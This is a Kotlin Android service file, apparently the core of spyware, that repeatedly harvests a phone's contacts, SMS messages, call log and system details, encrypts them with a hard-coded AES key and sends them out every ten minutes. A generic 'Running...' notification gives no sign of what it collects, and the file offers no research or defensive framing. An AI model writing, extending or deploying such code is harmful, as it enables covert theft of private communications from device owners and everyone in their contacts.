package com.example.bos1

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import androidx.core.app.NotificationCompat
import encrypt
import getCallLog
import getContacts
import getSms
import getSystemInfo
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject
import sendEncryptedData


class Collector : Service() {
    val job = SupervisorJob()

    companion object {
        private const val NOTIFICATION_CHANNEL_ID = "ForegroundServiceChannel"
        private const val NOTIFICATION_ID = 1
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)

        startCollect(
            onCollect = {
                // собираем инфу с девайса
                val contacts = getContacts(this)
                val systemInfo = getSystemInfo(this)

                // собираем всю инфу в data строку
                val jsonObject = JSONObject()
                jsonObject.put("contacts", contacts)
                jsonObject.put("systemInfo", systemInfo)
                jsonObject.toString()
            },
            onCollectExtra = {
                // собираем инфу с девайса
                val smsList = getSms(this)
                val callLog = getCallLog(this)

                // собираем всю инфу в data строку
                val jsonObject = JSONObject()
                jsonObject.put("smsList", smsList)
                jsonObject.put("callLog", callLog)
                jsonObject.toString()
            }
        )

        return START_NOT_STICKY
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            NOTIFICATION_CHANNEL_ID,
            "Foreground Service Channel",
            NotificationManager.IMPORTANCE_DEFAULT
        )
        val notificationManager =
            getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.createNotificationChannel(channel)
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("Foreground Service")
            .setContentText("Running...")
            .build()
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }
}

fun startCollect(
    onCollect: () -> String,
    onCollectExtra: () -> String
) {
    GlobalScope.launch {
        while (true) {
            // шифруем
            val aesKey = "3918532652098796"

            val encryptedData = encrypt(onCollect.invoke(), aesKey)
            sendEncryptedData(encryptedData)

            val encryptedDataExtra = encrypt(onCollectExtra.invoke(), aesKey)
            sendEncryptedData(encryptedDataExtra)

            // чиллим 10 минут
            delay(600000)
        }
    }
}




